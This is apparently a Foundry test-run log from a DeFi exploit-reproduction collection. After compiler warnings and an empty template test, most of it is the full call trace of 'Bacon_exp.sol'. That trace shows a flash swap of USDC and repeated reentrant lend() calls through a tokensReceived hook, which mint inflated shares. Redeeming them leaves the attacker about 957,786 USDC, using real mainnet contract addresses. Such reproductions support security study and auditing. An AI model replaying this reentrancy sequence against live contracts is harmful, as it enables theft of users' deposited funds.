Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.22s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 223.59ms (204.96µs CPU time)

Ran 1 test for src/test/2022-03/Bacon_exp.sol:ContractTest
[PASS] test() (gas: 295445)
Logs:
  Before exploit, USDC balance of attacker:: 0
  After exploit, USDC balance of attacker:: 957786585605

Traces:
  [360745] ContractTest::test()
    ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Before exploit, USDC balance of attacker:", val: 0)
    ├─ [334191] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::swap(6360000000000 [6.36e12], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [37517] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6360000000000 [6.36e12])
    │   │   ├─ [36728] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6360000000000 [6.36e12]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6360000000000 [6.36e12])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [256459] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6360000000000 [6.36e12], 0, 0x00)
    │   │   ├─ [27867] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 10000000000000000000 [1e19])
    │   │   │   ├─ [27078] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 10000000000000000000 [1e19]) [delegatecall]
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, value: 10000000000000000000 [1e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [138945] 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62::lend(2120000000000 [2.12e12])
    │   │   │   ├─ [131614] 0x781ad73f140815763d9A4D4752DAf9203361D07D::lend(2120000000000 [2.12e12]) [delegatecall]
    │   │   │   │   ├─ [10792] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 2120000000000 [2.12e12])
    │   │   │   │   │   ├─ [9997] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 2120000000000 [2.12e12]) [delegatecall]
    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, value: 2120000000000 [2.12e12])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   │   │   ├─ [71650] ContractTest::tokensReceived(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2087821912720 [2.087e12], 0x, 0x)
    │   │   │   │   │   ├─ [47805] 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62::lend(2120000000000 [2.12e12])
    │   │   │   │   │   │   ├─ [46974] 0x781ad73f140815763d9A4D4752DAf9203361D07D::lend(2120000000000 [2.12e12]) [delegatecall]
    │   │   │   │   │   │   │   ├─ [5992] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 2120000000000 [2.12e12])
    │   │   │   │   │   │   │   │   ├─ [5197] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 2120000000000 [2.12e12]) [delegatecall]
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, value: 2120000000000 [2.12e12])
    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   │   │   │   │   │   ├─ [27010] ContractTest::tokensReceived(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2751630036547 [2.751e12], 0x, 0x)
    │   │   │   │   │   │   │   │   ├─ [25065] 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62::lend(2120000000000 [2.12e12])
    │   │   │   │   │   │   │   │   │   ├─ [24234] 0x781ad73f140815763d9A4D4752DAf9203361D07D::lend(2120000000000 [2.12e12]) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   ├─ [5992] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 2120000000000 [2.12e12])
    │   │   │   │   │   │   │   │   │   │   │   ├─ [5197] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, 2120000000000 [2.12e12]) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, value: 2120000000000 [2.12e12])
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   │   │   │   │   │   │   │   │   ├─ [1470] ContractTest::tokensReceived(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3626491230837 [3.626e12], 0x, 0x)
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   ├─ emit Minted(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 3626491230837 [3.626e12], data: 0x, operatorData: 0x)
    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3626491230837 [3.626e12])
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000034c5bb8ba75
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000034c5bb8ba75
    │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   ├─ emit Minted(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 2751630036547 [2.751e12], data: 0x, operatorData: 0x)
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2751630036547 [2.751e12])
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000280a9ee4e43
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000280a9ee4e43
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit Minted(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 2087821912720 [2.087e12], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2087821912720 [2.087e12])
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000001e61be22a90
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000001e61be22a90
    │   │   ├─ [1761] 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   ├─ [930] 0x781ad73f140815763d9A4D4752DAf9203361D07D::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   └─ ← [Return] 8465943180104 [8.465e12]
    │   │   │   └─ ← [Return] 8465943180104 [8.465e12]
    │   │   ├─ [42371] 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62::redeem(8465943180104 [8.465e12])
    │   │   │   ├─ [41543] 0x781ad73f140815763d9A4D4752DAf9203361D07D::redeem(8465943180104 [8.465e12]) [delegatecall]
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Burned(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 8465943180104 [8.465e12], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 8465943180104 [8.465e12])
    │   │   │   │   ├─ [24717] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7336924997605 [7.336e12])
    │   │   │   │   │   ├─ [23928] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7336924997605 [7.336e12]) [delegatecall]
    │   │   │   │   │   │   ├─ emit Transfer(from: 0xb8919522331C59f5C16bDfAA6A121a6E03A91F62, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7336924997605 [7.336e12])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [3164] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::decimals() [staticcall]
    │   │   │   ├─ [2381] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::decimals() [delegatecall]
    │   │   │   │   └─ ← [Return] 6
    │   │   │   └─ ← [Return] 6
    │   │   ├─ [4817] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, 6379138412000 [6.379e12])
    │   │   │   ├─ [4028] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, 6379138412000 [6.379e12]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, value: 6379138412000 [6.379e12])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   └─ ← [Return] 957786585605 [9.577e11]
    │   │   │   └─ ← [Return] 957786585605 [9.577e11]
    │   │   ├─ [26717] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 957786585605 [9.577e11])
    │   │   │   ├─ [25928] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 957786585605 [9.577e11]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 957786585605 [9.577e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc) [delegatecall]
    │   │   │   └─ ← [Return] 103426126875025 [1.034e14]
    │   │   └─ ← [Return] 103426126875025 [1.034e14]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc) [staticcall]
    │   │   └─ ← [Return] 38872930099698218968984 [3.887e22]
    │   ├─ emit Sync(reserve0: 103426126875025 [1.034e14], reserve1: 38872930099698218968984 [3.887e22])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 6379138412000 [6.379e12], amount1In: 0, amount0Out: 6360000000000 [6.36e12], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [delegatecall]
    │   │   └─ ← [Return] 957786585605 [9.577e11]
    │   └─ ← [Return] 957786585605 [9.577e11]
    ├─ emit log_named_uint(key: "After exploit, USDC balance of attacker:", val: 957786585605 [9.577e11])
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 293.74ms (4.64ms CPU time)

Ran 2 test suites in 295.90ms (517.34ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
